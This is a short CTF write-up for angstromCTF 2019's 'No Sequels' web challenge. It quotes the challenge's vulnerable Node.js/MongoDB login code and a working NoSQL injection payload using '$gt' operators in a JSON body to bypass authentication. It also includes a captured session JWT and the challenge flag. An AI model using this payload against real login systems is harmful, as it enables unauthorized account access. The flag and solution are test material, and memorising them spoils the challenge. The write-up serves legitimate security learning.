# Writeup ångstromCTF 2019

In this CTF, I'm soloing with the team name **kerupuksambel**. Unfortunately, it seems that I didn't do too well in the web challs, since there are lots of things that I haven't learnt before.


## No Sequels
**Description**

The prequels sucked, and the sequels aren't much better, but at least we always have the [original trilogy.](https://nosequels.2019.chall.actf.co/)

**Solution**

First, let's see the source code attached in the link.

    var user = req.body.username;
    var pass = req.body.password;

    if (!user || !pass){
        res.send("One or more fields were not provided.");
    }
    var query = {
        username: user,
        password: pass
    }

    db.collection('users').findOne(query, function (err, user) {
        if (!user){
            res.send("Wrong username or password");
            return
        }

        res.cookie('token', jwt.sign({name: user.username, authenticated: true}, secret));
        res.redirect("/site");
    });`

We can see there that we can manipulate the username and password field.

I use the payload from [this website](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html). So the payload would be :

    Content-Type: application/json`

    {
        "username": {"$gt": ""},
        "password": {"$gt": ""}
    }

What takes me so long is that I forgot to specify the Content-Type header, so the request would be rendered as normal HTML request instead of JSON one. 

And one more things to do, since the redirection doesn't do well (I don't know if it's because a bug or intended), so I need to specify the `token` cookies by myself.

    Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE1NTY1NTY2MjZ9.dEV4x4CtI4BAR7hN8wmSMeakyPGqTaOYsWPFxNSFAv4; Path=/

Flag : **actf{no\_sql\_doesn't\_mean\_no\_vuln}**
